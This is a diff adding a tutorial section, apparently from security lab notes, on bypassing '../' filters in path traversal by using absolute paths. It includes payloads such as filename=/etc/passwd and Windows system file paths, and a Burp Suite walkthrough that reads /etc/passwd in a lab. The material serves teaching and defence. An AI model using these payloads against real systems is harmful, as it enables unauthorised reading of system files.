@@ -392,3 +392,297 @@ Server reads arbitrary system files.
 ```
 
 ---
+
+# Topic: Common Obstacles to Exploiting Path Traversal Vulnerabilities
+
+
+After developers learn about path traversal, they often add protections to block:
+
+```text
+../
+```
+
+However, these protections are sometimes incomplete and can be bypassed.
+
+# Normal Path Traversal Attack
+
+Suppose the application reads:
+
+```text
+/loadImage?filename=218.png
+```
+
+Attacker changes it to:
+
+```text
+/loadImage?filename=../../../etc/passwd
+```
+
+Result:
+
+```text
+/etc/passwd
+```
+
+is read.
+
+
+# Obstacle 1: Application Blocks `../`
+
+Some applications try to remove traversal sequences.
+
+Example:
+
+```text
+../../../etc/passwd
+```
+
+becomes:
+
+```text
+etc/passwd
+```
+
+The developer thinks the attack is prevented.
+
+# Absolute Path Bypass
+
+Instead of using:
+
+```text
+../../../etc/passwd
+```
+
+an attacker may try:
+
+```text
+filename=/etc/passwd
+```
+
+This is called an **absolute path**.
+
+### Relative Path
+
+Starts from the current directory:
+
+```text
+../../../etc/passwd
+```
+
+### Absolute Path
+
+Starts from the filesystem root:
+
+```text
+/etc/passwd
+```
+
+
+# Visualization
+
+### Relative Path
+
+```text
+/var/www/images/
+      ↑
+     ../
+/var/www/
+      ↑
+     ../
+/var/
+      ↑
+     ../
+/
+      ↓
+/etc/passwd
+```
+
+
+### Absolute Path
+
+Directly:
+
+```text
+/
+/etc/passwd
+```
+
+No traversal sequences are needed.
+
+
+# Why This Works
+
+Suppose the application only checks for:
+
+```text
+../
+```
+
+and blocks it.
+
+But it does **not** check for:
+
+```text
+/etc/passwd
+```
+
+Then the attacker can still access the file.
+
+
+# Linux Example
+
+Request:
+
+```text
+/loadImage?filename=/etc/passwd
+```
+
+The application may return:
+
+```text
+root:x:0:0:root:/root:/bin/bash
+```
+
+# Windows Example
+
+An attacker may try:
+
+```text
+filename=C:\Windows\win.ini
+```
+
+or
+
+```text
+filename=C:\Windows\System32\drivers\etc\hosts
+```
+
+These are absolute paths on Windows systems.
+
+
+# Developer Mistake
+
+Developer only blocks:
+
+```text
+../
+```
+
+but forgets about:
+
+```text
+/etc/passwd
+C:\Windows\win.ini
+```
+
+As a result, sensitive files can still be accessed.
+
+# Path Traversal Using an Absolute Path
+
+![lab1-](screenshots/labp2.png)
+
+## Step 1: Intercept a Product Image Request
+
+1. Open any product page.
+2. Click a product image.
+3. In Burp Suite, go to:
+
+```text
+Proxy > HTTP History
+```
+
+4. Locate the image request.
+
+Example:
+
+```http
+GET /image?filename=218.png HTTP/2
+```
+
+## Step 2: Modify the Filename Parameter
+
+Replace:
+
+```http
+filename=218.png
+```
+
+with:
+
+```http
+filename=/etc/passwd
+```
+
+Modified request:
+
+```http
+GET /image?filename=/etc/passwd HTTP/2
+```
+
+## Step 3: Send the Request
+
+1. Forward the modified request.
+2. Observe the response.
+
+
+## Step 4: Read the File
+
+The application returns the contents of:
+
+```text
+/etc/passwd
+```
+
+Example:
+
+```text
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+...
+```
+![lab1-](screenshots/pb2.png)
+
+## Step 5: Lab Solved
+
+Successfully retrieving:
+
+```text
+/etc/passwd
+```
+
+confirms the Path Traversal vulnerability and solves the lab.
+
+![lab1-](screenshots/labp2s.png)
+
+# Vulnerability Explanation
+
+### Normal Request
+
+```http
+GET /image?filename=218.png
+```
+
+Application loads:
+
+```text
+/images/218.png
+```
+
+### Absolute Path Attack
+
+```http
+GET /image?filename=/etc/passwd
+```
+
+Instead of loading an image file, the application directly accesses:
+
+```text
+/etc/passwd
+```
+
+because it fails to validate the filename parameter.
+
+---
+
